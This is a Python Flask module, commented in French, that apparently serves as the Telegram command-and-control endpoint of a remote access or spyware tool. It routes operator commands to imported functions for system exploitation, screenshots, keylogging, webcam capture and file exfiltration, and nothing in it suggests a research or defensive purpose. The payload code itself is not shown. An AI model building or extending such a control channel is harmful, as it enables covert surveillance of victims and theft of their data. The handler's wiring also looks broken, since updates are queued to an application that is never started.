import os
import json
from flask import Blueprint, request, abort
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler
from telegram_bot.utils import get_api_keys  # ✅ Corrigé
from telegram_bot.telegram_bot import (       # ✅ Corrigé
    menu, osint, scan, exploit_sys,
    screenshot, keylogger_start,
    webcam_snap, exfiltrate, exfiltrate_path,
    rapport
)

# 🔐 Chargement des clés API
api = get_api_keys()
TOKEN = api.get("TELEGRAM_BOT_TOKEN")
SECRET_TOKEN = api.get("TELEGRAM_SECRET_TOKEN")

telegram_webhook = Blueprint("telegram_webhook", __name__)

@telegram_webhook.route("/telegram/webhook", methods=["POST"])
def handle_webhook():
    # ✅ Vérification du header secret (sécurité)
    header_token = request.headers.get("X-Telegram-Bot-Api-Secret-Token")
    if SECRET_TOKEN and header_token != SECRET_TOKEN:
        abort(403, description="⛔ Jeton secret invalide")

    try:
        data = request.get_json()
        update = Update.de_json(data, ApplicationBuilder().token(TOKEN).build().bot)

        # 🧠 Création de l'application et ajout des handlers
        app = ApplicationBuilder().token(TOKEN).build()
        app.add_handler(CommandHandler("menu", menu))
        app.add_handler(CommandHandler("osint", osint))
        app.add_handler(CommandHandler("scan", scan))
        app.add_handler(CommandHandler("exploit_sys", exploit_sys))
        app.add_handler(CommandHandler("screenshot", screenshot))
        app.add_handler(CommandHandler("keylogger_start", keylogger_start))
        app.add_handler(CommandHandler("webcam_snap", webcam_snap))
        app.add_handler(CommandHandler("exfiltrate", exfiltrate))
        app.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
        app.add_handler(CommandHandler("rapport", rapport))

        # ⚙️ Traitement de la mise à jour
        app.update_queue.put_nowait(update)

        return {"status": "ok"}

    except Exception as e:
        abort(500, description=f"❌ Erreur webhook : {str(e)}")
